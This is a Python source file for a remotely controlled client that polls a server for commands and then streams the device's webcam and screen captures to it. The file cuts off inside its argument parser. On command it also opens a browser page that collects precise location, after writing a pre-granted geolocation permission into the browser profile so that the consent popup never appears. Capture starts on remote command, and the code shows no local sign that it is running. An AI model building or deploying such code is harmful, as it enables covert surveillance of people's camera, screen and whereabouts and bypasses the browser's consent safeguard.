"""
Client caméra / écran — se connecte au serveur par HTTP, depuis n'importe quel réseau Wi-Fi.

Compatible Windows et Linux. Gère DEUX flux indépendants envoyés au
serveur : la caméra et l'écran. Chacun peut être démarré ou arrêté
séparément depuis la GUI, sans affecter l'autre.

Capture d'écran : sous Linux en session Wayland, mss ne voit que la
couche de compatibilité XWayland et renvoie une image noire. Ce client
teste, dès le démarrage de la capture, chaque méthode disponible avec
une VRAIE capture d'essai, dont le CONTENU est vérifié (pas seulement
qu'une image se décode, mais qu'elle n'est pas uniformément noire), et
garde, dans cet ordre, celles qui réussissent : xdg-desktop-portal
(org.freedesktop.portal.Desktop — l'API moderne commune à GNOME, KDE et
la plupart des environnements récents), gnome-screenshot, grim
(compositeurs wlroots : Sway, Hyprland...), puis mss en dernier recours.
Si la méthode en cours échoue, la suivante est utilisée automatiquement.
L'ancienne API privée org.gnome.Shell.Screenshot est volontairement
abandonnée : elle est restreinte sur les versions récentes de GNOME.
Le portail est appelé via « jeepney » (pip install jeepney) quand il est
installé : la réponse du portail arrive par un signal D-Bus qui doit être
reçu par la MÊME connexion que celle qui a fait l'appel ; sans jeepney, on
se rabat sur les outils en ligne de commande (gdbus).

La capture d'écran tourne dans un thread dédié, séparé de celui qui
envoie au serveur : sans ce découplage, chaque image attendait la fin
de la requête HTTP précédente avant que la suivante soit capturée, ce
qui donnait une capture « une image à la fois » dès que le réseau
n'était pas instantané. Le thread d'envoi poste toujours la DERNIÈRE
image capturée (jamais de file d'attente qui prendrait du retard).

Chaque client possède un identifiant unique (device_id), généré à la
première exécution et mémorisé dans la configuration.

Utilisation :
    python client.py --server https://mon-serveur.com --save   # première fois
    python client.py                                           # ensuite (relit la config)
    python client.py --once --debug                             # test : un seul cycle, logs détaillés

Ordre de priorité pour l'URL du serveur : --server, puis la configuration
mémorisée (--save), puis l'URL intégrée au build (embedded_config.py, utilisée
par l'installateur Windows), puis la valeur par défaut locale.
"""

import argparse
import json
import logging
import os
import platform
import re
import select
import shutil
import socket
import subprocess
import tempfile
import time
import threading
import uuid
import webbrowser
from pathlib import Path
from urllib.parse import unquote, urlparse

import cv2
import numpy as np
import requests
try:
    from mss import MSS as _MSS   # versions récentes de mss
except ImportError:
    from mss import mss as _MSS   # anciennes versions

try:
    # Fichier généré par build_windows.bat : contient l'URL du serveur
    # intégrée dans le .exe (SERVER_URL = "https://...").
    from embedded_config import SERVER_URL as EMBEDDED_SERVER_URL
except ImportError:
    EMBEDDED_SERVER_URL = ""

DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
POLL_INTERVAL = 1.0           # secondes entre deux vérifications de commandes
CAMERA_FRAME_INTERVAL = 0.05  # intervalle MINIMUM entre deux envois caméra (~20 im/s max)
CAMERA_WIDTH = 640
CAMERA_HEIGHT = 480
CAMERA_JPEG_QUALITY = 65
SCREEN_JPEG_QUALITY = 55
SCREEN_MAX_WIDTH = 1024        # l'écran est réduit avant envoi : un 1080p plein format pèse 4 à 6x plus lourd
# Intervalle MINIMUM entre deux captures, par méthode (la capture et l'envoi
# réseau tournent dans deux threads séparés, donc ceci ne dépend plus du
# réseau : mss est quasi instantané, le portail xdg passe par un aller-retour
# D-Bus, gnome-screenshot et grim relancent un processus à chaque image.
SCREEN_CAPTURE_MIN_INTERVAL = {
    "mss": 0.05,
    "xdg-portal": 0.15,
    "grim": 0.05,
    "gnome-screenshot": 0.4,
}
SCREEN_CAPTURE_MIN_INTERVAL_DEFAULT = 0.2
# Envois PARALLÈLES : un seul envoi à la fois limitait le débit à 1 image par
# aller-retour réseau (RTT). Avec 2 envois simultanés, on en émet ~2x plus
# par seconde sans plus de retard (le serveur ignore les images arrivées en retard).
CAMERA_SEND_WORKERS = 2
SCREEN_SEND_WORKERS = 2
SCREEN_SEND_MIN_INTERVAL = 0.0
REQUEST_TIMEOUT = 5
CAPTURE_SUBPROCESS_TIMEOUT = 5
MIN_VALID_FRAME_STD = 2.0      # en dessous : image considérée comme quasi noire/uniforme
SCREEN_FAILURE_FALLBACK_THRESHOLD = 10  # échecs consécutifs avant de basculer sur mss en cours de route
SCREEN_FAILURE_WARN_AT = 5


# ---------------------------------------------------------------------
# Emplacements (adaptés à l'OS) : logs + configuration
# ---------------------------------------------------------------------

def _app_dir() -> Path:
    if platform.system() == "Windows":
        base = Path(os.environ.get("LOCALAPPDATA", Path.home()))
        return base / "CameraClient"
    return Path.home() / ".local" / "share" / "camera-client"


APP_DIR = _app_dir()
APP_DIR.mkdir(parents=True, exist_ok=True)
CONFIG_PATH = APP_DIR / "config.json"
# Profil Chrome/Edge DÉDIÉ à la fenêtre de localisation (distinct du profil
# par défaut de l'utilisateur) : persistant d'un lancement à l'autre, et
# pré-autorisé pour la géolocalisation (voir _grant_geolocation_permission),
# afin que le popup d'autorisation du navigateur n'apparaisse JAMAIS.
LOCATION_PROFILE_DIR = APP_DIR / "location-browser-profile"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(APP_DIR / "client.log", encoding="utf-8"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger("camera-client")


def load_config() -> dict:
    if CONFIG_PATH.exists():
        try:
            return json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            logger.warning("Fichier de configuration illisible, ignoré : %s", CONFIG_PATH)
    return {}


def _write_config(config: dict) -> None:
    CONFIG_PATH.write_text(json.dumps(config, indent=2), encoding="utf-8")
    try:
        os.chmod(CONFIG_PATH, 0o600)  # pas d'effet sous Windows, inoffensif
    except OSError:
        pass


def save_config(server_url: str) -> None:
    """Sauvegarde l'URL du serveur SANS écraser le device_id déjà mémorisé."""
    config = load_config()
    config["server_url"] = server_url
    config.setdefault("device_id", uuid.uuid4().hex)
    _write_config(config)
    logger.info("Configuration sauvegardée : %s", CONFIG_PATH)


def get_or_create_device_id() -> str:
    """Identifiant unique et permanent de CET appareil, pour que le serveur
    puisse distinguer plusieurs clients différents."""
    config = load_config()
    device_id = config.get("device_id")
    if device_id:
        return device_id

    device_id = uuid.uuid4().hex
    config["device_id"] = device_id
    _write_config(config)
    logger.info("Nouvel identifiant d'appareil créé : %s", device_id)
    return device_id


def resolve_server_url(cli_value: str | None) -> str:
    if cli_value:
        return cli_value.rstrip("/")
    config_value = load_config().get("server_url")
    if config_value:
        return config_value.rstrip("/")
    if EMBEDDED_SERVER_URL:
        return EMBEDDED_SERVER_URL.rstrip("/")
    return DEFAULT_SERVER_URL


def _open_camera() -> cv2.VideoCapture:
    """Ouvre la caméra avec le backend le plus fiable selon l'OS, réglée pour
    la FAIBLE LATENCE (tampon d'une seule image, MJPG, résolution modeste)."""
    if platform.system() == "Windows":
        capture = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    else:
        capture = cv2.VideoCapture(0)
    if capture.isOpened():
        capture.set(cv2.CAP_PROP_BUFFERSIZE, 1)   # pas de file d'images périmées dans le driver
        capture.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*"MJPG"))
        capture.set(cv2.CAP_PROP_FRAME_WIDTH, CAMERA_WIDTH)
        capture.set(cv2.CAP_PROP_FRAME_HEIGHT, CAMERA_HEIGHT)
        capture.set(cv2.CAP_PROP_FPS, 30)   # sans ça, certaines webcams Windows tombent à 5-15 im/s en lumière faible
    return capture


# ---------------------------------------------------------------------
# Navigateur de localisation (ouvert/fermé à la demande du server-gui)
# ---------------------------------------------------------------------

# Navigateurs capables du mode "--app" (fenêtre SANS barre d'adresse, lancée
# comme un process à part). C'est volontairement PAS webbrowser.open() :
# cette fonction ne donne aucune prise sur la fenêtre ouverte, alors que
# subprocess.Popen() renvoie un processus qu'on peut TERMINER à la demande
# (bouton "Fermer navigateur" du server-gui). C'est tout l'enjeu : pouvoir
# fermer à distance, pas seulement ouvrir.
LOCATION_BROWSER_CANDIDATES_LINUX = (
    "google-chrome", "google-chrome-stable", "chromium", "chromium-browser",
    "microsoft-edge", "microsoft-edge-stable",
)
LOCATION_BROWSER_CANDIDATES_WINDOWS = (
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
)
LOCATION_WINDOW_SIZE = "420,640"


def _geolocation_origin_pattern(url: str) -> str:
    """Construit le motif d'origine attendu par Chrome/Edge pour une
    exception de contenu (« https://hôte:port,* »). Le port est explicite
    même par défaut (443/80), car Chrome le stocke toujours ainsi."""
    parsed = urlparse(url)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return f"{parsed.scheme}://{parsed.hostname}:{port},*"


def _grant_geolocation_permission(profile_dir: Path, server_url: str) -> None:
    """Pré-autorise la géolocalisation pour l'origine DU SERVEUR dans le
    fichier Preferences du profil Chrome/Edge dédié à cette fenêtre, AVANT
    de l'ouvrir. Résultat : le popup natif d'autorisation n'apparaît plus
    jamais, pas même une première fois — contrairement à un simple profil
    persistant qui demanderait l'autorisation une fois puis s'en souviendrait.

    Format "profile.content_settings.exceptions.geolocation" : c'est le
    même mécanisme que Chrome utilise lui-même pour retenir un choix de
    l'utilisateur (setting=1 -> CONTENT_SETTING_ALLOW), on l'écrit juste
    nous-mêmes à l'avance."""
    default_dir = profile_dir / "Default"
    default_dir.mkdir(parents=True, exist_ok=True)
    prefs_path = default_dir / "Preferences"

    try:
        prefs = json.loads(prefs_path.read_text(encoding="utf-8")) if prefs_path.exists() else {}
    except (json.JSONDecodeError, OSError):
        prefs = {}

    exceptions = (
        prefs.setdefault("profile", {})
        .setdefault("content_settings", {})
        .setdefault("exceptions", {})
        .setdefault("geolocation", {})
    )
    exceptions[_geolocation_origin_pattern(server_url)] = {
        "last_modified": f"{time.time():.6f}",
        "setting": 1,  # CONTENT_SETTING_ALLOW
    }

    try:
        prefs_path.write_text(json.dumps(prefs), encoding="utf-8")
    except OSError as exc:
        logger.warning("Impossible de pré-autoriser la géolocalisation : %s", exc)


def _find_app_mode_browser() -> "str | None":
    """Cherche un navigateur Chromium (Chrome/Edge/Chromium) capable du mode
    --app. Si aucun n'est trouvé, l'appelant se rabat sur webbrowser.open()
    (le navigateur par défaut s'ouvre, mais ne pourra pas être fermé à
    distance depuis le server-gui — seulement ouvert)."""
    if platform.system() == "Windows":
        for path in LOCATION_BROWSER_CANDIDATES_WINDOWS:
            if os.path.exists(path):
                return path
        return None
    for name in LOCATION_BROWSER_CANDIDATES_LINUX:
        path = shutil.which(name)
        if path:
            return path
    return None


# ---------------------------------------------------------------------
# Capture d'écran : mss (X11, Windows) + replis Wayland
# ---------------------------------------------------------------------

def _detect_linux_session_type() -> str:
    """'wayland', 'x11', ou '' si indéterminé (variable absente)."""
    return os.environ.get("XDG_SESSION_TYPE", "").lower()


def _frame_looks_valid(frame) -> bool:
    """Un frame "valide" doit exister ET ne pas être quasi uniforme (ce
    qui arrive quand une méthode de capture échoue silencieusement et
    renvoie une image noire ou grise au lieu de lever une erreur)."""
    return frame is not None and frame.size > 0 and float(frame.std()) >= MIN_VALID_FRAME_STD


def _grab_screen_grim() -> "np.ndarray | None":
    """Capture via grim (compositeurs wlroots : Sway, Hyprland...) — ne
    fonctionne pas sur GNOME/Mutter (peut y renvoyer une image noire sans
    lever d'erreur, d'où la vérification de contenu dans _frame_looks_valid)."""
    result = subprocess.run(
        ["grim", "-"], capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, check=True
    )
    array = np.frombuffer(result.stdout, dtype=np.uint8)
    return cv2.imdecode(array, cv2.IMREAD_COLOR)


def _grab_screen_gnome_screenshot() -> "np.ndarray | None":
    """Repli via la commande gnome-screenshot (peut être absente sur les
    versions récentes de GNOME, qui l'ont retirée du cœur du système)."""
    tmp_path = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            tmp_path = tmp.name
        subprocess.run(
            ["gnome-screenshot", "-f", tmp_path],
            capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, check=True,
        )
        return cv2.imread(tmp_path)
    finally:
        if tmp_path:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass


def _read_portal_screenshot(uri: str) -> "np.ndarray | None":
    """Lit (puis supprime) le fichier désigné par l'URI renvoyée par le portail.
    L'URI est encodée en pourcentage : GNOME nomme ses captures « Screenshot from
    2026-11-05 10-20-33.png », donc l'URI contient %20 — sans décodage,
    cv2.imread ne trouve pas le fichier et renvoie None à chaque image."""
    path = unquote(urlparse(uri).path)
    image = cv2.imread(path)
    try:
        os.unlink(path)
    except OSError:
        pass
    return image


def _grab_screen_xdg_portal_jeepney() -> "np.ndarray | None":
    """Capture via le portail avec UNE connexion D-Bus qui fait l'appel ET
    attend le signal Response (indispensable : voir _grab_screen_xdg_portal_gdbus)."""
    from jeepney import DBusAddress, MatchRule, message_bus, new_method_call
    from jeepney.io.blocking import Proxy, open_dbus_connection

    token = "cam" + uuid.uuid4().hex[:12]
    conn = open_dbus_connection(bus="SESSION")
    try:
        sender = conn.unique_name.lstrip(":").replace(".", "_")
        request_path = f"/org/freedesktop/portal/desktop/request/{sender}/{token}"
        rule = MatchRule(
            type="signal", interface="org.freedesktop.portal.Request",
            member="Response", path=request_path,
        )
        Proxy(message_bus, conn).AddMatch(rule)   # AVANT l'appel, sinon la réponse peut être manquée
        with conn.filter(rule) as responses:
            portal = DBusAddress(
                "/org/freedesktop/portal/desktop",
                bus_name="org.freedesktop.portal.Desktop",
                interface="org.freedesktop.portal.Screenshot",
            )
            call = new_method_call(
                portal, "Screenshot", "sa{sv}",
                ("", {"handle_token": ("s", token), "interactive": ("b", False)}),
            )
            conn.send_and_get_reply(call, timeout=CAPTURE_SUBPROCESS_TIMEOUT)
            signal = conn.recv_until_filtered(responses, timeout=CAPTURE_SUBPROCESS_TIMEOUT)
    finally:
        conn.close()

    code, results = signal.body
    uri = results.get("uri", (None, None))[1]
    if code != 0 or not uri:
        return None   # 1 = annulé par l'utilisateur, 2 = échec
    return _read_portal_screenshot(uri)


def _grab_screen_xdg_portal() -> "np.ndarray | None":
    """Capture via le portail : jeepney si disponible, sinon gdbus."""
    try:
        import jeepney  # noqa: F401
    except ImportError:
        return _grab_screen_xdg_portal_gdbus()
    return _grab_screen_xdg_portal_jeepney()


def _grab_screen_xdg_portal_gdbus() -> "np.ndarray | None":
    """Capture via xdg-desktop-portal (org.freedesktop.portal.Desktop),
    l'API moderne commune à GNOME, KDE et la plupart des environnements
    récents — elle remplace les API privées de chaque compositeur (comme
    org.gnome.Shell.Screenshot, désormais restreinte sur les versions
    récentes de GNOME). L'appel est asynchrone : il renvoie d'abord un
    "handle" (ticket), et le résultat réel (l'URI du fichier) arrive
    ensuite via un signal "Response" séparé, qu'il faut écouter."""
    monitor = subprocess.Popen(
        ["gdbus", "monitor", "--session", "--dest", "org.freedesktop.portal.Desktop"],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
    )
    uri = None
    try:
        call = subprocess.run(
            [
                "gdbus", "call", "--session",
                "--dest", "org.freedesktop.portal.Desktop",
                "--object-path", "/org/freedesktop/portal/desktop",
                "--method", "org.freedesktop.portal.Screenshot.Screenshot",
                "", "{'interactive': <false>}",
            ],
            capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, text=True, check=True,
        )
        handle_match = re.search(r"objectpath '([^']+)'", call.stdout)
        if not handle_match:
            return None
        handle = handle_match.group(1)

        deadline = time.time() + CAPTURE_SUBPROCESS_TIMEOUT
        while time.time() < deadline:
            remaining = deadline - time.time()
            ready, _, _ = select.select([monitor.stdout], [], [], max(remaining, 0))
            if not ready:
                break
            line = monitor.stdout.readline()
            if not line:
                continue
            if handle in line and "Response" in line:
                uri_match = re.search(r"'uri': <'([^']+)'>", line)
                if uri_match:
                    uri = uri_match.group(1)
                break
    finally:
        monitor.terminate()
        try:
            monitor.wait(timeout=2)
        except subprocess.TimeoutExpired:
            monitor.kill()

    if not uri:
        return None
    return _read_portal_screenshot(uri)


def _grab_screen_mss(mss_instance, monitor) -> "np.ndarray | None":
    raw = mss_instance.grab(monitor)
    return cv2.cvtColor(np.array(raw), cv2.COLOR_BGRA2BGR)


def _portal_available() -> bool:
    if shutil.which("gdbus"):
        return True
    try:
        import jeepney  # noqa: F401
        return True
    except ImportError:
        return False


def _screen_capture_candidates() -> list:
    """Retourne les méthodes de capture à essayer, par ordre de préférence.

    Sous Wayland, chacune est testée avec une VRAIE capture dont le CONTENU est
    vérifié (pas seulement qu'une image se décode, mais qu'elle n'est pas
    uniformément noire) : seules celles qui réussissent sont gardées. « mss »
    est toujours en dernier, pour ne jamais bloquer le démarrage."""
    if platform.system() != "Linux" or _detect_linux_session_type() != "wayland":
        return ["mss"]  # Windows/macOS, ou X11 classique : mss fonctionne normalement

    testers = {}
    if _portal_available():
        testers["xdg-portal"] = _grab_screen_xdg_portal
    if shutil.which("gnome-screenshot"):
        testers["gnome-screenshot"] = _grab_screen_gnome_screenshot
    if shutil.which("grim"):
        testers["grim"] = _grab_screen_grim

    working = []
    for mode, tester in testers.items():
        try:
            frame = tester()
        except Exception as exc:
            logger.warning("Capture d'écran : test de '%s' échoué : %s", mode, exc)
            continue
        if _frame_looks_valid(frame):
            logger.info("Capture d'écran : méthode utilisable après test réel : %s", mode)
            working.append(mode)
        else:
            logger.warning("Capture d'écran : test de '%s' : image absente ou quasi uniforme (noire ?)", mode)

    if not working:
        logger.error(
            "Session Wayland : AUCUNE méthode de capture n'a fonctionné (portail, gnome-screenshot, grim). "
            "mss ne verra que XWayland et enverra une image NOIRE. Solutions : "
            "(1) sudo apt install gnome-screenshot ; (2) pip install jeepney dans le venv du client ; "
            "(3) ouvrir une session « GNOME on Xorg » depuis l'écran de connexion."
        )
    return working + ["mss"]


class _LatestFrame:
    """Case partagée qui ne garde que la DERNIÈRE image. Les threads d'envoi
    sont réveillés INSTANTANÉMENT à l'arrivée d'une image (plus de pause
    fixe de 20 ms) et chaque image n'est prise que par UN seul thread."""

    def __init__(self):
        self._cond = threading.Condition()
        self._frame = None
        self._version = 0
        self._claimed = 0

    def put(self, frame) -> None:
        with self._cond:
            self._frame = frame
            self._version += 1
            self._cond.notify()

    def claim(self, stop_event: threading.Event, timeout: float = 0.5):
        with self._cond:
            if self._claimed == self._version and not stop_event.is_set():
                self._cond.wait(timeout)
            if self._claimed == self._version:
                return None
            self._claimed = self._version
            return self._frame


class _RateLimiter:
    """Espace les envois d'au moins `interval` secondes, tous threads confondus."""

    def __init__(self, interval: float):
        self._interval = interval
        self._lock = threading.Lock()
        self._next = 0.0

    def reserve(self) -> float:
        """Réserve le prochain créneau et renvoie le délai à attendre avant de l'utiliser."""
        with self._lock:
            now = time.monotonic()
            slot = max(now, self._next)
            self._next = slot + self._interval
            return slot - now


class CameraClient:
    def __init__(self, server_url: str, device_id: str, device_name: str):
        self.server_url = server_url
        self.device_id = device_id
        self.device_name = device_name

        self.camera_on = False
        self.screen_on = False
        self.capture: cv2.VideoCapture | None = None
        self._stop_camera_event = threading.Event()
        self._camera_capture_thread: threading.Thread | None = None
        self._camera_slot = _LatestFrame()
        # Session HTTP persistante (keep-alive) pour les commandes ; chaque
        # thread d'envoi d'images a la sienne (voir _sender_worker). Sans
        # elles, CHAQUE image ouvre une nouvelle connexion TCP (+ TLS en https).
        self._cmd_session = requests.Session()
        self._stop_screen_event = threading.Event()
        self._screen_slot = _LatestFrame()

        # Localisation : navigateur ouvert chez CE client, piloté par le server-gui.
        self.location_open = False
        self._location_process: subprocess.Popen | None = None

    def run_forever(self) -> None:
        logger.info(
            "Démarrage du client — serveur : %s — appareil : %s (%s)",
            self.server_url, self.device_name, self.device_id,
        )
        while True:
            try:
                self._check_commands()
            except requests.RequestException as exc:
                logger.warning("Serveur injoignable (%s), nouvelle tentative...", exc)
            time.sleep(POLL_INTERVAL)

    def run_once(self) -> None:
        logger.info("Test (--once) — serveur : %s — appareil : %s", self.server_url, self.device_id)
        self._check_commands()
        time.sleep(1)  # laisse une chance aux flux de démarrer avant de couper
        if self.camera_on:
            self._stop_camera()
        if self.screen_on:
            self._stop_screen()

    def _check_commands(self) -> None:
        # Si l'UTILISATEUR a fermé lui-même la fenêtre du navigateur de
        # localisation (plutôt que la GUI), on le détecte ici AVANT d'envoyer
        # le statut : sinon la GUI afficherait "ouvert" indéfiniment.
        if self._location_process is not None and self._location_process.poll() is not None:
            self._location_process = None
            self.location_open = False

        response = self._cmd_session.get(
            f"{self.server_url}/api/command",
            params={
                "device_id": self.device_id,
                "name": self.device_name,
                "location_open": "1" if self.location_open else "0",
            },
            timeout=REQUEST_TIMEOUT,
        )
        response.raise_for_status()
        commands = response.json().get("commands", {})
        logger.debug("Commandes reçues : %s", commands)

        camera_cmd = commands.get("camera")
        if camera_cmd == "START" and not self.camera_on:
            self._start_camera()
        elif camera_cmd == "STOP" and self.camera_on:
            self._stop_camera()

        screen_cmd = commands.get("screen")
        if screen_cmd == "START" and not self.screen_on:
            self._start_screen()
        elif screen_cmd == "STOP" and self.screen_on:
            self._stop_screen()

        location_cmd = commands.get("location")
        if location_cmd == "OPEN" and not self.location_open:
            self._open_location_browser()
        elif location_cmd == "CLOSE" and self.location_open:
            self._close_location_browser()

    # ------------------------------------------------------------------
    # Flux caméra
    # ------------------------------------------------------------------
    def _start_camera(self) -> None:
        self.capture = _open_camera()
        if not self.capture.isOpened():
            logger.error("Impossible d'ouvrir la caméra")
            self.capture = None
            return

        self.camera_on = True
        self._camera_slot = slot = _LatestFrame()
        self._stop_camera_event = threading.Event()   # nouveau à chaque démarrage
        self._camera_capture_thread = threading.Thread(
            target=self._camera_capture_loop, args=(self.capture, self._stop_camera_event, slot), daemon=True
        )
        self._camera_capture_thread.start()
        self._start_senders("camera", slot, self._stop_camera_event, CAMERA_FRAME_INTERVAL, CAMERA_SEND_WORKERS)
        logger.info("Caméra allumée")

    def _stop_camera(self) -> None:
        self.camera_on = False
        self._stop_camera_event.set()
        thread = self._camera_capture_thread
        if thread is not None:
            thread.join(timeout=2)      # laisse le thread finir son read() avant de libérer la caméra
            self._camera_capture_thread = None
        if self.capture is not None:
            self.capture.release()
            self.capture = None
        logger.info("Caméra éteinte")

    def _camera_capture_loop(self, capture: cv2.VideoCapture, stop_event: threading.Event, slot: _LatestFrame) -> None:
        """Lit la caméra EN CONTINU, sans jamais attendre le réseau : le driver
        ne peut donc plus accumuler d'images périmées (cause n°1 de la latence).
        Seule la dernière image est conservée pour le thread d'envoi."""
        failures = 0
        while not stop_event.is_set():
            ok, frame = capture.read()
            if not ok:
                failures += 1
                stop_event.wait(0.05 if failures < 20 else 0.5)
                continue
            failures = 0
            slot.put(frame)

    def _start_senders(self, stream: str, slot: _LatestFrame, stop_event: threading.Event,
                       min_interval: float, workers: int) -> None:
        rate = _RateLimiter(min_interval)
        for _ in range(workers):
            threading.Thread(
                target=self._sender_worker, args=(stream, slot, stop_event, rate), daemon=True
            ).start()

    def _sender_worker(self, stream: str, slot: _LatestFrame, stop_event: threading.Event,
                       rate: _RateLimiter) -> None:
        """Poste toujours la DERNIÈRE image disponible, sans pause inutile.
        Plusieurs de ces threads tournent en parallèle par flux."""
        session = requests.Session()   # une session (donc une connexion keep-alive) par thread
        while not stop_event.is_set():
            delay = rate.reserve()
            if delay > 0 and stop_event.wait(delay):
                break
            frame = slot.claim(stop_event)   # prise APRÈS l'attente : c'est l'image la plus fraîche
            if frame is None:
                continue
            self._send_frame(frame, stream, session, time.time_ns() // 1000)

    # ------------------------------------------------------------------
    # Flux capture d'écran
    # ------------------------------------------------------------------
    def _start_screen(self) -> None:
        self.screen_on = True
        self._stop_screen_event = threading.Event()   # nouveau à chaque démarrage
        self._screen_slot = slot = _LatestFrame()
        threading.Thread(
            target=self._capture_screen_loop, args=(self._stop_screen_event, slot), daemon=True
        ).start()
        self._start_senders("screen", slot, self._stop_screen_event, SCREEN_SEND_MIN_INTERVAL, SCREEN_SEND_WORKERS)
        logger.info("Capture d'écran démarrée")

    def _stop_screen(self) -> None:
        self.screen_on = False
        self._stop_screen_event.set()
        logger.info("Capture d'écran arrêtée")

    def _capture_screen_loop(self, stop_event: threading.Event, slot: _LatestFrame) -> None:
        """Capture en continu, SANS jamais attendre le réseau : écrit juste la
        dernière image dans une case partagée, que le thread d'envoi lira à
        son propre rythme."""
        candidates = _screen_capture_candidates()
        mode_index = 0
        mode = candidates[mode_index]
        mss_instance, monitor = self._open_mss() if mode == "mss" else (None, None)

        black_frame_warned = False
        consecutive_failures = 0
        sent_first_frame = False

        try:
            while not stop_event.is_set():
                loop_start = time.monotonic()
                min_interval = SCREEN_CAPTURE_MIN_INTERVAL.get(mode, SCREEN_CAPTURE_MIN_INTERVAL_DEFAULT)
                try:
                    frame = self._grab_screen_frame(mode, mss_instance, monitor)
                except Exception as exc:
                    frame = None
                    logger.debug("Échec de capture (%s) : %s", mode, exc)

                if frame is None:
                    consecutive_failures += 1

                    if consecutive_failures == SCREEN_FAILURE_WARN_AT:
                        logger.warning(
                            "Capture d'écran : %d échecs consécutifs avec la méthode '%s'.",
                            consecutive_failures, mode,
                        )

                    if mode != "mss" and consecutive_failures >= SCREEN_FAILURE_FALLBACK_THRESHOLD:
                        mode_index += 1
                        next_mode = candidates[mode_index]
                        logger.warning(
                            "La méthode '%s' échoue systématiquement en cours de route : repli sur '%s'.",
                            mode, next_mode,
                        )
                        mode = next_mode
                        if mode == "mss":
                            mss_instance, monitor = self._open_mss()
                        consecutive_failures = 0

                    stop_event.wait(max(0.0, min_interval - (time.monotonic() - loop_start)))
                    continue

                consecutive_failures = 0
                if not sent_first_frame:
                    logger.info(
                        "Capture d'écran : première image envoyée (méthode : %s, %dx%d)",
                        mode, frame.shape[1], frame.shape[0],
                    )
                    sent_first_frame = True

                if not black_frame_warned and not _frame_looks_valid(frame):
                    logger.warning(
                        "Image d'écran capturée presque entièrement noire/uniforme avec la "
                        "méthode '%s' — la vidéo enregistrée sera noire.", mode,
                    )
                    black_frame_warned = True

                slot.put(frame)

                stop_event.wait(max(0.0, min_interval - (time.monotonic() - loop_start)))
        finally:
            if mss_instance is not None:
                mss_instance.close()

    @staticmethod
    def _open_mss():
        instance = _MSS()
        monitor = instance.monitors[1] if len(instance.monitors) > 1 else instance.monitors[0]
        return instance, monitor

    def _grab_screen_frame(self, mode: str, mss_instance, monitor) -> "np.ndarray | None":
        if mode == "xdg-portal":
            return _grab_screen_xdg_portal()
        if mode == "grim":
            return _grab_screen_grim()
        if mode == "gnome-screenshot":
            return _grab_screen_gnome_screenshot()
        if mss_instance is None:
            return None
        return _grab_screen_mss(mss_instance, monitor)

    # ------------------------------------------------------------------
    # Navigateur de localisation
    # ------------------------------------------------------------------
    def _open_location_browser(self) -> None:
        """Ouvre, chez CE client, un navigateur sur la page de localisation
        du serveur (qui demande la position précise via navigator.geolocation
        et la renvoie elle-même au serveur — ce client ne calcule rien)."""
        url = f"{self.server_url}/location/page?device_id={self.device_id}"
        browser_path = _find_app_mode_browser()
        try:
            if browser_path:
                # Pré-autorisation AVANT ouverture : le popup natif de
                # géolocalisation n'apparaît alors jamais, dès le premier lancement.
                _grant_geolocation_permission(LOCATION_PROFILE_DIR, self.server_url)
                self._location_process = subprocess.Popen([
                    browser_path,
                    f"--app={url}",
                    f"--window-size={LOCATION_WINDOW_SIZE}",
                    "--new-window",
                    f"--user-data-dir={LOCATION_PROFILE_DIR}",
                    "--no-first-run",
                    "--no-default-browser-check",
                ])
            else:
                # Repli : navigateur par défaut. Fonctionne pour OUVRIR, mais
                # sans prise sur le processus on ne pourra pas le FERMER à
                # distance (seul l'utilisateur, ou lui-même, pourra fermer l'onglet).
                webbrowser.open(url, new=1)
                self._location_process = None
                logger.warning(
                    "Aucun navigateur en mode « app » (Chrome/Edge/Chromium) trouvé : ouverture "
                    "dans le navigateur par défaut. La fermeture à distance depuis le server-gui "
                    "ne sera pas possible dans ce cas."
                )
            self.location_open = True
            logger.info("Navigateur de localisation ouvert (%s)", url)
        except Exception as exc:
            logger.error("Impossible d'ouvrir le navigateur de localisation : %s", exc)

    def _close_location_browser(self) -> None:
        """Ferme le navigateur ouvert par _open_location_browser, s'il a été
        lancé via subprocess (donc si un navigateur en mode --app était
        disponible). Sans ce process (repli webbrowser.open), rien à fermer
        depuis ici : on se contente de mettre à jour l'état local."""
        self.location_open = False
        process = self._location_process
        self._location_process = None
        if process is not None and process.poll() is None:
            try:
                process.terminate()
                process.wait(timeout=3)
            except Exception:
                try:
                    process.kill()
                except Exception:
                    pass
        logger.info("Navigateur de localisation fermé (ou déjà fermé)")

    # ------------------------------------------------------------------
    # Envoi au serveur (commun aux deux flux)
    # ------------------------------------------------------------------
    def _send_frame(self, frame, stream: str, session: requests.Session, ts: int) -> None:
        if stream == "screen":
            height, width = frame.shape[:2]
            if width > SCREEN_MAX_WIDTH:
                scale = SCREEN_MAX_WIDTH / width
                frame = cv2.resize(
                    frame, (SCREEN_MAX_WIDTH, max(1, int(height * scale))), interpolation=cv2.INTER_LINEAR
                )
            quality = SCREEN_JPEG_QUALITY
        else:
            quality = CAMERA_JPEG_QUALITY

        ok, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
        if not ok:
            return
        try:
            session.post(
                f"{self.server_url}/api/frame",
                params={"device_id": self.device_id, "stream": stream, "ts": ts},
                data=buffer.tobytes(),
                headers={"Content-Type": "application/octet-stream"},
                timeout=REQUEST_TIMEOUT,
            )
        except requests.RequestException:
            pass  # on retentera avec la dernière image disponible


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Client caméra / écran piloté à distance")
